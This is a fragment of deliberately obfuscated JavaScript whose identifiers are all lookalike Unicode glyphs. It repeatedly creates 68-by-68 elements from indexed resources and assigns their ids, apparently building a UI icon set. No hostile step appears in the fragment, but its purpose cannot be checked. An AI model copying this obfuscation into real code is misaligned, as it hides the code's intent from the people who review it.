			this.ⵠⵠΔ[ᐃᐃ.ΔΔΔⵠΔ].id = ᐃᐃ.ΔΔΔⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔᐃΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠⵠⵠᐃⲆⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔᐃΔⵠ].id = ᐃᐃ.ᐃΔᐃΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⵠⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃⲆⲆᐃⲆᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⵠⵠᐃ].id = ᐃᐃ.ΔⲆⵠⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⲆⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆⲆⲆⵠᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⲆⲆⲆ].id = ᐃᐃ.ⲆⲆⲆⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔΔⲆⵠᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔᐃⲆ].id = ᐃᐃ.ⲆⵠΔᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆΔⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃⵠᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆΔⲆⲆ].id = ᐃᐃ.ᐃⲆΔⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠΔΔΔⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃΔΔ].id = ᐃᐃ.ⵠⲆᐃΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔΔΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆΔᐃⵠΔⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔΔΔᐃ].id = ᐃᐃ.ΔΔΔΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔΔⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠΔⲆⲆⲆᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔΔⵠᐃ].id = ᐃᐃ.ΔΔΔⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⲆⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆⵠⵠⲆᐃᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⲆⲆᐃ].id = ᐃᐃ.ⵠΔⲆⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠⵠⲆⲆΔᐃ], ΔΔᐃΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠΔΔ].id = ᐃᐃ.ⲆᐃⵠΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆⵠⵠᐃᐃΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⵠ].id = ᐃᐃ.ⵠⵠᐃⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠΔⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔᐃΔΔΔᐃ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠΔⵠΔ].id = ᐃᐃ.ΔⵠΔⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔᐃⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠⵠᐃᐃⵠᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔᐃⲆᐃ].id = ᐃᐃ.ⲆΔᐃⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠⵠⵠⵠⵠΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔⲆΔ].id = ᐃᐃ.ⲆⵠΔⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠᐃΔⵠᐃⲆ], ΔΔᐃΔ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠⵠⵠᐃ].id = ᐃᐃ.ᐃⵠⵠⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆΔⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆⵠⲆⵠⵠⵠ], ᐃᐃⵠⲆᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆΔⲆᐃ].id = ᐃᐃ.ΔⲆΔⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠΔⵠΔⵠᐃ], ΔᐃⲆΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔΔⵠ].id = ᐃᐃ.ⲆⵠΔΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔΔⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔΔⲆⵠ].id = ᐃᐃ.ⵠΔΔⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⵠᐃⵠ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔΔⵠ].id = ᐃᐃ.ᐃᐃΔΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔⲆᐃᐃⲆᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆΔᐃ].id = ᐃᐃ.ΔᐃⲆΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⲆΔΔⲆⵠ], ⵠⵠⵠᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔⲆⲆ].id = ᐃᐃ.ⲆⵠΔⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⲆΔΔΔΔⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃⵠⵠⲆ].id = ᐃᐃ.ⲆᐃⵠⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔᐃⵠⵠⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃⲆᐃ].id = ᐃᐃ.ⵠⲆᐃⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠᐃⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔᐃⲆⲆⵠⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠᐃⵠⲆ].id = ᐃᐃ.ⲆⵠᐃⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⵠΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆⲆᐃΔᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⵠΔⲆ].id = ᐃᐃ.ΔⵠⵠΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔΔⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃΔⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔΔⲆⲆ].id = ᐃᐃ.ΔΔΔⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃⲆⲆⵠⲆⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃᐃΔ].id = ᐃᐃ.ᐃⵠᐃᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⲆΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆⵠΔⵠᐃⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⲆΔⵠ].id = ᐃᐃ.ΔⲆⲆΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔⵠΔⵠⵠᐃ], Δⵠᐃⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆᐃᐃᐃ].id = ᐃᐃ.ⵠⲆᐃᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃⲆⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⲆᐃⵠ], ⵠᐃⵠⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃⲆⲆᐃ].id = ᐃᐃ.ᐃᐃⲆⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⵠΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⲆⵠᐃⵠᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⵠΔᐃ].id = ᐃᐃ.ΔⵠⵠΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⲆⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔΔⲆΔᐃⲆ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⲆⵠΔ].id = ᐃᐃ.ΔΔⲆⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃΔΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃⲆⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃΔΔᐃ].id = ᐃᐃ.ⵠᐃΔΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃᐃⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⲆΔΔⵠⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃᐃⲆΔ].id = ᐃᐃ.ⵠᐃᐃⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔᐃⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃᐃΔⲆⲆⵠ], ⵠⵠⵠᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔᐃⲆΔ].id = ᐃᐃ.ΔΔᐃⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆᐃⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⲆᐃⵠᐃⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆᐃⲆᐃ].id = ᐃᐃ.ᐃⲆᐃⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃΔⵠⵠᐃⵠ], ΔᐃⲆΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⵠ].id = ᐃᐃ.ⵠᐃⲆᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆⵠᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠᐃⵠᐃⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆⵠᐃ].id = ᐃᐃ.ⵠᐃⲆⵠᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⲆΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆᐃΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠⲆΔⲆ].id = ᐃᐃ.ⲆⵠⲆΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔᐃΔⵠΔᐃ], ΔⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆᐃᐃ].id = ᐃᐃ.ΔⵠⲆᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆⲆⵠⲆⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆⲆⵠ].id = ᐃᐃ.ⵠⲆⲆⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⲆᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔΔΔΔΔⲆ], ᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔⲆᐃᐃ].id = ᐃᐃ.ΔΔⲆᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠᐃΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃΔΔⵠᐃⵠ], ΔⲆᐃⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠᐃΔⲆ].id = ᐃᐃ.ΔⵠᐃΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆΔΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠᐃⲆⲆΔⵠ], ⵠⵠⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆΔΔⵠ].id = ᐃᐃ.ᐃⲆΔΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃΔⲆΔⲆᐃ], ΔⲆᐃⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⵠ].id = ᐃᐃ.ⵠⲆⲆⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔΔⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔⲆⵠΔΔⵠ], ᐃⲆᐃᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔΔⲆᐃ].id = ᐃᐃ.ⲆΔΔⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⵠΔⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃⵠⲆⵠΔⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⵠΔⲆ].id = ᐃᐃ.ⲆΔⵠΔⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔΔΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃΔΔⲆΔⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔΔΔΔ].id = ᐃᐃ.ᐃΔΔΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.Ⲇⵠᐃᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⲆⲆᐃⵠΔ], ΔⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.Ⲇⵠᐃᐃⵠ].id = ᐃᐃ.Ⲇⵠᐃᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⲆᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔᐃΔⲆⲆΔ], ᐃᐃⵠⲆᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⲆᐃᐃ].id = ᐃᐃ.ⲆⲆⲆᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠⲆⲆⵠⵠᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠΔⲆᐃ].id = ᐃᐃ.ⲆⵠΔⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃΔⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔΔⵠⵠΔⵠ], ᐃⲆᐃᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃΔⲆⲆ].id = ᐃᐃ.ⵠᐃΔⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠⲆⲆΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔΔᐃΔΔⲆⵠ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠⲆⲆΔ].id = ᐃᐃ.ᐃⵠⲆⲆΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠᐃⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃΔᐃⲆΔᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠᐃⲆⵠ].id = ᐃᐃ.ⲆⵠᐃⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆᐃΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⲆⵠⵠ].id = ᐃᐃ.ΔⵠⲆⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⲆΔΔ], ΔⲆᐃⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠᐃⲆⲆⵠ].id = ᐃᐃ.ⵠᐃⲆⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃⲆᐃ], ΔᐃⲆΔ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⲆ].id = ᐃᐃ.ᐃⲆⲆᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⵠΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠⵠⵠ], ΔΔⵠΔ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠⵠΔⵠ].id = ᐃᐃ.ⵠⵠⵠΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃΔᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠᐃⵠΔᐃᐃᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆᐃΔᐃᐃ].id = ᐃᐃ.ⲆᐃΔᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔᐃⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⲆⵠᐃ], ⲆΔⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔᐃⲆⲆ].id = ᐃᐃ.ⵠΔᐃⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔΔᐃᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆⲆΔᐃⵠⵠ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ΔΔᐃᐃᐃ].id = ᐃᐃ.ΔΔᐃᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.Ⲇⵠᐃⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠⵠᐃⲆⵠΔ], ᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.Ⲇⵠᐃⵠⵠ].id = ᐃᐃ.Ⲇⵠᐃⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⵠᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠΔⵠⲆᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⵠᐃⵠ].id = ᐃᐃ.ΔⲆⵠᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆᐃᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠᐃⲆⵠΔᐃ], ⲆⲆΔⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃⲆᐃᐃ].id = ᐃᐃ.ΔᐃⲆᐃᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⵠⲆⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆᐃⵠⵠⵠΔⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⵠⲆⲆ].id = ᐃᐃ.ᐃΔⵠⲆⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃⵠᐃᐃᐃΔ], ᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃᐃΔⵠΔ].id = ᐃᐃ.ᐃᐃΔⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃᐃΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆⵠⵠΔⲆⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃᐃΔΔ].id = ᐃᐃ.ΔᐃᐃΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠᐃΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠⵠΔⵠⲆᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⵠᐃΔΔ].id = ᐃᐃ.ⲆⵠᐃΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆΔⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⲆΔᐃⲆⵠᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆΔⲆᐃ].id = ᐃᐃ.ⲆⲆΔⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⵠᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠΔⲆΔᐃⲆ], ⵠᐃⵠⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆⵠᐃⲆ].id = ᐃᐃ.ΔⲆⵠᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆΔⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠᐃᐃⵠᐃⲆ], ⵠΔΔΔΔ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆΔⵠΔ].id = ᐃᐃ.ΔⲆΔⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⲆᐃⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠΔⲆΔⵠᐃ], ᐃᐃⲆΔⵠ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃΔⲆᐃⲆ].id = ᐃᐃ.ᐃΔⲆᐃⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃᐃΔᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⲆᐃⲆⵠⲆⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔᐃᐃΔᐃ].id = ᐃᐃ.ΔᐃᐃΔᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⵠⵠΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠΔΔᐃⲆΔᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ΔⵠⵠⵠΔ].id = ᐃᐃ.ΔⵠⵠⵠΔ;
			this.ⵠⵠΔ[ᐃᐃ.Δⵠⵠⵠⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆⵠⲆᐃⲆᐃᐃ], ⵠⵠⵠⵠ);
			this.ⵠⵠΔ[ᐃᐃ.Δⵠⵠⵠⵠ].id = ᐃᐃ.Δⵠⵠⵠⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆᐃΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔᐃΔⵠⵠᐃⲆ], ⲆⲆΔⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ΔⲆᐃΔⵠ].id = ᐃᐃ.ΔⲆᐃΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃⲆᐃ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠΔⵠᐃΔΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃⲆᐃ].id = ᐃᐃ.ᐃⵠᐃⲆᐃ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠΔⲆⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠⲆⵠⲆⲆΔ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠΔⲆⵠ].id = ᐃᐃ.ⵠⵠΔⲆⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔᐃⵠᐃⲆⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆⲆⵠΔΔ].id = ᐃᐃ.ⲆⲆⵠΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⲆᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ΔⵠⲆᐃⵠᐃⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⲆᐃⵠ].id = ᐃᐃ.ⵠΔⲆᐃⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⵠⲆΔᐃⲆΔ], ᐃᐃⲆⲆ);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⲆ].id = ᐃᐃ.ⵠⲆⲆⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⵠΔⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.Δⵠⵠⵠᐃᐃⵠ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⲆΔⵠΔⵠ].id = ᐃᐃ.ⲆΔⵠΔⵠ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠᐃⵠⲆ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⵠⲆᐃⵠΔΔⲆ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠⵠᐃⵠⲆ].id = ᐃᐃ.ⵠⵠᐃⵠⲆ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃΔΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ⲆΔΔⲆᐃᐃⵠ], ΔᐃⲆΔ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⵠᐃΔΔ].id = ᐃᐃ.ᐃⵠᐃΔΔ;
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⲆᐃΔ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃΔⲆⵠⵠΔᐃ], 3);
			this.ⵠⵠΔ[ᐃᐃ.ⵠΔⲆᐃΔ].id = ᐃᐃ.ⵠΔⲆᐃΔ;
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⵠ] = Δⵠⵠ(68, 68, "", ⵠⲆ[Ⲇ.ᐃⵠΔⵠⵠⲆΔ], ΔⲆΔᐃ);
			this.ⵠⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⵠ].id = ᐃᐃ.ᐃⲆⲆᐃⵠ;
